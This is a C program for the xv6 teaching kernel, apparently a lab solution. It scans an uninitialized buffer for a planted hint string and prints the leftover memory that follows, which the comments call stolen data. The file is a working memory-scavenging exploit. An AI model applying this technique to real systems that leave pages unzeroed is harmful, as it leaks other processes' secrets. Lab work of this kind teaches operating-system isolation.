#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#define TARGET_PAGES 100
#define PGSIZE 4096
#define STEAL_SIZE TARGET_PAGES * PGSIZE
// const steal_rodata[VALID_SIZE];
char steal_data[STEAL_SIZE];
int main(int argc, char *argv[]) {
    // Start probing from fixed address; once target is found,read immediate subsequent data.
    // And hints is a pre-placed string:"This may help."
    if(argc>1){
        printf("In attack, you should not place other argument!\n");
        exit(1);
    }
    //Since the text are placed highest position,we adapt a aggressive way
    //kmp to find the target string
    char hint[20]; //Stack Allocation(Immediate values instead of literals)
    //To avoid creating a copy in .data or .rodata sections.
    hint[0] = 'T'; hint[1] = 'h'; hint[2] = 'i'; hint[3] = 's'; 
    hint[4] = ' '; hint[5] = 'm'; hint[6] = 'a'; hint[7] = 'y';
    hint[8] = ' '; hint[9] = 'h'; hint[10]='e'; hint[11]='l';
    hint[12]='p'; hint[13]='.'; hint[14]='\0';
    char *src_ptr, *dst_ptr, *dst_end;
    src_ptr=hint;
    dst_ptr=steal_data, dst_end=steal_data+STEAL_SIZE;
    while(dst_ptr!=dst_end){
        while(*src_ptr==*dst_ptr && *src_ptr!='\0'){
            src_ptr++;dst_ptr++;
        }
        if(*src_ptr=='\0'){
            //steal the target data successfully!
            printf("%s\n", dst_ptr+2);
            break;
        }
        dst_ptr++;
        src_ptr=hint;//reset the statement
    }
    // printf("1\n");
    exit(1);
}
